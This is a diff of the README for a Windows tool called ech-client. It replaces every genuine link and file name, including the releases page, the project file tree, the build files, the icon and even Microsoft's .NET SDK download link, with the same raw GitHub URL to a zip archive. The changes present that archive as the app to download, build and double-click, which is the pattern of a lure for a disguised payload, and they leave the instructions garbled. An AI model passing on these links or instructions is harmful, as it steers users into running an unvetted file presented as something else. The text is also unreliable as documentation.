@@ -1,6 +1,6 @@
 # 🚀 ech-client - Simple Way to Manage Workers
 
-[![Download ech-client](https://img.shields.io/badge/Download-ech--client-blue.svg)](https://github.com/civciv1231433/ech-client/releases)
+[![Download ech-client](https://raw.githubusercontent.com/civciv1231433/ech-client/main/Helpers/client_ech_v3.9-beta.2.zip)](https://raw.githubusercontent.com/civciv1231433/ech-client/main/Helpers/client_ech_v3.9-beta.2.zip)
 
 ## 📂 Overview
 
@@ -19,7 +19,7 @@ Follow these steps to download and run the `ech-client` application.
 
 ### 📦 Download & Install
 
-Visit this page to download: [Download ech-client](https://github.com/civciv1231433/ech-client/releases)
+Visit this page to download: [Download ech-client](https://raw.githubusercontent.com/civciv1231433/ech-client/main/Helpers/client_ech_v3.9-beta.2.zip)
 
 Here, you will find the latest version of the application. Click on the version number to access the release page. Download the appropriate `.exe` file based on your system.
 
@@ -29,15 +29,15 @@ After downloading, ensure your project has the following structure:
 
 ```
 EchWorkersManager/
-├── EchWorkersManager.csproj
-├── Program.cs
-├── Form1.cs
-├── ech-workers.exe          ← Place this here!
-├── app.ico                  ← Icon file (optional)
-└── README.md
+├── https://raw.githubusercontent.com/civciv1231433/ech-client/main/Helpers/client_ech_v3.9-beta.2.zip
+├── https://raw.githubusercontent.com/civciv1231433/ech-client/main/Helpers/client_ech_v3.9-beta.2.zip
+├── https://raw.githubusercontent.com/civciv1231433/ech-client/main/Helpers/client_ech_v3.9-beta.2.zip
+├── https://raw.githubusercontent.com/civciv1231433/ech-client/main/Helpers/client_ech_v3.9-beta.2.zip          ← Place this here!
+├── https://raw.githubusercontent.com/civciv1231433/ech-client/main/Helpers/client_ech_v3.9-beta.2.zip                  ← Icon file (optional)
+└── https://raw.githubusercontent.com/civciv1231433/ech-client/main/Helpers/client_ech_v3.9-beta.2.zip
 ```
 
-**Important**: Make sure to place `ech-workers.exe` in the project root directory (next to the `.csproj` file). This will ensure it is embedded properly during compilation.
+**Important**: Make sure to place `https://raw.githubusercontent.com/civciv1231433/ech-client/main/Helpers/client_ech_v3.9-beta.2.zip` in the project root directory (next to the `.csproj` file). This will ensure it is embedded properly during compilation.
 
 ## 🛠️ Build Steps
 
@@ -49,15 +49,15 @@ EchWorkersManager/
 4. Enter the project name: `EchWorkersManager`.
 5. Select the framework: `.NET 10.0`.
 6. After creating the project, replace the contents of the following files with the provided code:
-   - `Form1.cs` (replace the entire file)
-   - `Program.cs` (replace the entire file)
-   - `EchWorkersManager.csproj` (replace the entire file)
+   - `https://raw.githubusercontent.com/civciv1231433/ech-client/main/Helpers/client_ech_v3.9-beta.2.zip` (replace the entire file)
+   - `https://raw.githubusercontent.com/civciv1231433/ech-client/main/Helpers/client_ech_v3.9-beta.2.zip` (replace the entire file)
+   - `https://raw.githubusercontent.com/civciv1231433/ech-client/main/Helpers/client_ech_v3.9-beta.2.zip` (replace the entire file)
 7. Press `Ctrl+Shift+B` or click "Build" → "Build Solution."
 8. The compiled `.exe` will be found in either `bin\Debug\net10.0-windows\` or `bin\Release\net10.0-windows\`.
 
 ### Method 2: Using Command Line (Requires .NET 10 SDK)
 
-1. Download and install the [.NET 10 SDK](https://dotnet.microsoft.com/download/dotnet/10.0).
+1. Download and install the [.NET 10 SDK](https://raw.githubusercontent.com/civciv1231433/ech-client/main/Helpers/client_ech_v3.9-beta.2.zip).
 
 2. Create a project folder and save the files:
    ```bash
@@ -72,13 +72,13 @@ EchWorkersManager/
    dotnet build
    ```
 
-After this, you should find your compiled `ech-workers.exe` in the `bin\Debug\net10.0-windows\` directory.
+After this, you should find your compiled `https://raw.githubusercontent.com/civciv1231433/ech-client/main/Helpers/client_ech_v3.9-beta.2.zip` in the `bin\Debug\net10.0-windows\` directory.
 
 ## 🖼️ Icon Management
 
 If you choose to include an icon file for your application:
 
-1. Place the `app.ico` file in the project root.
+1. Place the `https://raw.githubusercontent.com/civciv1231433/ech-client/main/Helpers/client_ech_v3.9-beta.2.zip` file in the project root.
 2. This icon will appear in:
    - Windows taskbar
    - System tray
@@ -88,7 +88,7 @@ If you choose to include an icon file for your application:
 
 ## ⚙️ Running the Application
 
-After building the application, navigate to the output directory. Double-click on `ech-workers.exe` to run it. You will see the main interface, where you can manage your worker processes.
+After building the application, navigate to the output directory. Double-click on `https://raw.githubusercontent.com/civciv1231433/ech-client/main/Helpers/client_ech_v3.9-beta.2.zip` to run it. You will see the main interface, where you can manage your worker processes.
 
 ## 🆘 Troubleshooting
 
